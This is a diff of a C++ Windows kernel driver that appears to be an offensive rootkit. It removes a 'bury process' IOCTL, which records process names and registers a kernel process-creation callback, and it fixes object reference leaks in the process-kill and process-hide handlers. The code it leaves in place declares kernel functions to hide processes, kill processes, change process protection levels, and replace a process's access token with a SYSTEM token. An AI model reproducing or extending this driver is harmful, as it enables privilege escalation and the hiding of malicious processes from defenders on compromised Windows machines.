@@ -7,7 +7,6 @@
 #include "DriverMeta.hpp"
 #include "Misc.hpp"
 #include "WinTypes.hpp"
-#include "KernelCallbacks.hpp"
 #include "AddressUtils.hpp"
 #include "Vector.hpp"
 #include "CallbackUtils.hpp"
@@ -52,7 +51,6 @@ NTSTATUS BeUnSupportedFunction(PDEVICE_OBJECT pDeviceObject, PIRP Irp);
 NTSTATUS BeIoctlTestDriver(PIRP Irp, PIO_STACK_LOCATION pIoStackIrp, ULONG* pdwDataWritten);
 NTSTATUS BeIoctlKillProcess(HANDLE pid);
 NTSTATUS BeIoctlProtectProcess(ULONG pid, BYTE newProcessProtection);
-NTSTATUS BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize);
 NTSTATUS BeIoCtlElevateProcessAcessToken(HANDLE pid);
 NTSTATUS BeIoctlKillProcess(HANDLE pid);
 NTSTATUS BeIoctlHideProcess(HANDLE pid);
@@ -112,14 +110,6 @@ BeIoControl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
                 IOCTL_PROTECT_PROCESS_PAYLOAD payload = { 0 };
                 RtlCopyMemory(&payload, buffer, sizeof(IOCTL_PROTECT_PROCESS_PAYLOAD)); // Copy over payload from IRP buffer
                 status = BeIoctlProtectProcess(payload.pid, payload.newProtectionLevel);
-            }
-            break;
-
-        case BE_IOCTL_BURY_PROCESS:
-            {
-                PWCHAR processToBury = (PWCHAR)buffer;
-                ULONG stringSize = pIoStackIrp->Parameters.DeviceIoControl.InputBufferLength;
-                status = BeIoctlBuryProcess(processToBury, stringSize);
             }
             break;
 
@@ -252,54 +242,6 @@ BeIoctlProtectProcess(ULONG pid, BYTE newProtectionLevel)
 }
 
 /**
- * Activates the callback to enable the "burying" functionality.
- *
- * @return NTSTATUS status code.
- */
-NTSTATUS
-BeIoctlBuryProcess(PWCHAR processToBury, ULONG dwSize)
-{
-    NTSTATUS NtStatus = STATUS_UNSUCCESSFUL;
-
-    LOG_MSG("BeIoctlBuryProcess called, size: %i \r\n", dwSize);
-    __try
-    {
-        NtStatus = BeCheckStringIsAlignedNotEmptyAndTerminated(processToBury, dwSize);
-        if (NtStatus != STATUS_SUCCESS)
-        {
-            return NtStatus;
-        }
-
-        // Allocate global memory for process name and copy over to global
-        BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length] = (WCHAR*)ExAllocatePoolWithTag(PagedPool, dwSize, DRIVER_TAG);
-        if (!BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length])
-        {
-            return STATUS_MEMORY_NOT_ALLOCATED;
-        }
-        RtlCopyMemory(BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length], processToBury, dwSize);
-        BeGlobals::beBuryTargetProcesses.length++; // increment number of processes buried
-
-        NtStatus = BeGlobals::pPsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE); // remove to avoid routines being registered twice
-        NtStatus = BeGlobals::pPsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, FALSE);
-        
-        if (NtStatus == STATUS_SUCCESS)
-        {
-            LOG_MSG("Added routine!\n");
-        }
-        else
-        {
-            LOG_MSG("Failed to add routine! Error: %i\n", NtStatus);
-        }
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        NtStatus = GetExceptionCode();
-    }
-
-    return NtStatus;
-}
-
-/**
  * Sets target process access token to a SYSTEM token.
  *
  * @param pid PID of target process.
@@ -353,10 +295,12 @@ BeIoctlKillProcess(HANDLE pid)
 {
     HANDLE hProcess = NULL;
 
-    if (BeGetEprocessByPid(HandleToULong(pid)) == NULL)
+    PEPROCESS prc = BeGetEprocessByPid(HandleToULong(pid));
+    if (prc == NULL)
     {
         return STATUS_INVALID_PARAMETER;
     }
+    ObDereferenceObject(prc);
 
     CLIENT_ID ci;
     ci.UniqueProcess = pid;
@@ -390,7 +334,6 @@ BeIoctlHideProcess(HANDLE pid)
     PEPROCESS targetProcess = BeGetEprocessByPid(HandleToULong(pid));
     if (targetProcess == NULL)
     {
-        ObDereferenceObject(targetProcess);
         return STATUS_INVALID_PARAMETER;
     }
 
